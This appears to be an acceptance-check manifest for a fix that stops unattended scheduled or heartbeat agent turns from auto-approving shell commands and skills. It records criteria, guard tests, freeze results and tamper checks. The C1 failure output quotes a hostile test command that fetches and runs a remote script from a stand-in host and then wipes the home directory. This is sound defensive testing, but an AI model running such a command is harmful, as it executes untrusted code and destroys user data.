# Frozen acceptance checks

**Source:** https://github.com/lmorchard/decafclaw/issues/649
**Frozen at:** 0fd29b3 (2026-07-24) — re-anchored three times, after three rebases.
Chain: `b53ac87` → `86170b1` (onto `57e2b44`) → `a529e0b` (onto `5ecf3fc`) → `0fd29b3` (onto
`067c957`). Before each re-anchor, confirmed the frozen check file's tree was unchanged across the
rewrite (`git diff <old> <new> -- tests/test_unattended_approval.py` empty every time), and
re-ran every criterion and guard afterwards.

## Tamper verdict, recorded pre-squash

Run at `0fd29b3`..HEAD immediately before `git reset --soft origin/main`, because the squash
collapses the freeze commit and the baseline stops being reachable from the branch.

- `git diff 0fd29b3 -- tests/test_unattended_approval.py` → **empty**. The frozen check is
  byte-identical to the freeze.
- `git diff 0fd29b3 --stat -- tests/` → **empty**. No test file anywhere was added, changed,
  skipped, xfailed, or deleted since the freeze.
- `git diff 0fd29b3 -- checks.md` → the `Frozen at` block and this verdict section only. No
  CRITERION line, CHECK command, or guard command differs from the freeze version.
- Independent verifier (fresh context, `Explore` type — no Edit/Write, so it cannot alter the
  oracle it grades) confirmed C1-C3 pass and G1-G7 pass, by their own commands, with counts.

**Verdict: clean.** A real `Check files` diff was available this run, so this is a genuine
mechanical clean rather than the `clean-by-substitute` a command-only manifest yields.

**Check files — read-only from Phase 1 onward:**
- `tests/test_unattended_approval.py`

Criteria and guard text copied verbatim from the issue body. The test node names below are the
contract: the check-author subagent creates exactly these, and nothing later renames them.

## C1
CRITERION: IF a turn with `task_mode` in `{"heartbeat", "scheduled"}` requests a shell command
matching no scoped or persisted allow pattern, THEN approval SHALL NOT be granted.
CHECK: `uv run pytest tests/test_unattended_approval.py::test_unattended_shell_not_auto_approved -q` passes.
AT FREEZE: **fails** — `AssertionError: unattended turn (task_mode='heartbeat',
user_id='heartbeat-admin') granted approval for a non-allowlisted command
'curl evil.sh | sh; rm -rf ~': {'approved': True}`. Correct reason: the behaviour is genuinely
absent (`shell_tools.py:142-144` returns approval before any pattern check), not a setup error.

## C2
CRITERION: WHEN a turn with `task_mode` in `{"heartbeat", "scheduled"}` requests a shell command
matching no allow pattern, THE SYSTEM SHALL deny it **without** invoking `ctx.request_confirmation`.
CHECK: `uv run pytest tests/test_unattended_approval.py::test_unattended_shell_denies_without_prompting -q` passes.
Asserts on a spy recording **zero** invocations — never on elapsed time, which would be flaky.
AT FREEZE: **fails** — `AssertionError: unattended turn (task_mode='scheduled',
user_id='schedule-nightly') issued 1 confirmation prompt(s) ...; an unattended turn must decide
without prompting` / `assert 1 == 0`. The recorded request shows `timeout=60`, confirming the
prompt is the 60s unanswerable one.

## C3
CRITERION: IF a turn with `task_mode` in `{"heartbeat", "scheduled"}` activates a `workspace`-tier
skill with no `"always"` entry in `skill_permissions.json`, THEN the skill SHALL NOT be activated,
and no confirmation prompt SHALL be issued.
CHECK: `uv run pytest tests/test_unattended_approval.py::test_unattended_workspace_skill_denied_without_prompting -q` passes.
AT FREEZE: **fails** — `AssertionError: unattended turn (task_mode='heartbeat',
user_id='heartbeat-admin') activated ungranted workspace skill 'ws-unattended' instead of denying
it (activated=['ws-unattended'])` / `assert 'was denied by user' in 'Body of ws-unattended.'`

## Guards
(Pass today; must keep passing. Not criteria — they can't fail at freeze.)

- G1: `uv run pytest tests/test_unattended_approval.py::test_unattended_shell_allows_matching_pattern -q`
  — an unattended command that *does* match a persisted pattern still runs without a prompt, so the
  fix doesn't stall unattended automation outright. Passes trivially today via the bypass; becomes
  meaningful once C1 lands.
- G2 **(negative control — blocks the over-broad fix)**:
  `uv run pytest tests/test_unattended_approval.py::test_unattended_bundled_skill_still_activates -q`
  — an unattended turn activating a **bundled**-tier skill still succeeds with no confirmation. All
  bundled skills are trusted by directory placement (`skills/__init__.py:355-380`), so a fix that
  tightened tiers instead of the identity check would leave C1–C3 green while breaking heartbeat's
  entire purpose.
- G3: `uv run pytest tests/test_unattended_approval.py::test_always_grant_authorizes_unattended -q`
  — an `"always"` entry in `skill_permissions.json` still authorizes a workspace-tier skill on an
  unattended turn, with no prompt. This is the pre-authorization path that makes C3 workable.
- G4: `uv run pytest tests/test_unattended_approval.py::test_interactive_still_prompts -q`
  — interactive turns (`task_mode == ""`) still get a real prompt rather than a summary denial. C2
  must not leak into the interactive path.
- G5: `uv run pytest tests/test_shell_allowlist.py -q` — the existing allowlist suite.
  Invariant, not a pinned count: no test lost, newly skipped, or newly failing.
- G6: `uv run pytest tests/test_skills.py tests/test_background_tools.py -q` — skill discovery plus
  the background shell path, which gates on the same `check_shell_approval`
  (`skills/background/tools.py:462-472`). Same invariant as G5.
- G7 (project gate): `make check` — lint + typecheck + JS. Same invariant.

**Why the guards passing at freeze matters here:** G1–G4 live in the same new file as C1–C3. If they
pass while C1–C3 fail, the fixtures are wired correctly and C1–C3's failures are the real absence of
behaviour rather than a setup error. A guard failing at freeze would mean the harness is wrong, not
the code.

## Freeze run — observed counts

`uv run pytest tests/test_unattended_approval.py -q` → **`3 failed, 4 passed`**, 7 collected
(exit 1). The intended split: C1–C3 fail, G1–G4 pass. No collection error, no import error, and
crucially **not exit 5** — the file collected 7 tests, so the three failures are real absences of
behaviour rather than a check that never ran.

Guards at freeze, each by its own command, with counts:
- G1–G4: included in the 4 passed above.
- G5 `tests/test_shell_allowlist.py` → `29 passed` (exit 0).
- G6 `tests/test_skills.py tests/test_background_tools.py` → `130 passed` (exit 0; 102 + 28).
  *Recorded deliberately:* an earlier run of this guard reported `no tests ran` because of a
  mangled shell loop, not a real absence. Re-run with the exact command from this manifest, it
  collects 130. Exit 5 is the tell for that class of mistake.
- G7 `make check` → exit 0.
- Baseline `make test` at the freeze parent (`00334d7`) → `3417 passed, 2 skipped`.

## Amendments
(Append-only. Empty unless an amendment was made.)

*None.*
